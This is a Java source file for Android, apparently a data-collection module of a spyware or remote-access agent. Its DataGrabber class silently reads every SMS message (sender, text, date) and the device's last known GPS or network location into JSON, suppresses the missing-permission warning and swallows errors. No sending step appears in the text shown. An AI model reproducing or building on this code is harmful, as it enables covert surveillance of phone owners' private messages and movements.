package com.zero.agent;
import android.annotation.SuppressLint; import android.content.Context; import android.database.Cursor;
import android.location.*; import android.provider.Telephony;
import org.json.*; import java.io.File;
public class DataGrabber {
    public static JSONArray getSMS(Context c) {
        JSONArray arr = new JSONArray();
        try { Cursor cur = c.getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC");
            if (cur != null) { int a = cur.getColumnIndexOrThrow("address"); int b = cur.getColumnIndexOrThrow("body"); int d = cur.getColumnIndexOrThrow("date");
                while (cur.moveToNext()) { JSONObject o = new JSONObject(); o.put("address", cur.getString(a)); o.put("body", cur.getString(b)); o.put("date", cur.getLong(d)); arr.put(o); }
                cur.close(); }
        } catch (Exception ignored) {}
        return arr;
    }
    @SuppressLint("MissingPermission")
    public static JSONObject getLastLocation(Context c) {
        JSONObject o = new JSONObject();
        try { LocationManager lm = (LocationManager) c.getSystemService(Context.LOCATION_SERVICE); Location loc = null;
            if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null && lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) { o.put("lat", loc.getLatitude()); o.put("lon", loc.getLongitude()); o.put("acc", loc.getAccuracy()); o.put("time", loc.getTime()); }
            else { o.put("msg","lokasi belum tersedia"); }
        } catch (Exception e) { try { o.put("msg", e.toString()); } catch (Exception ignored) {} }
        return o;
    }
}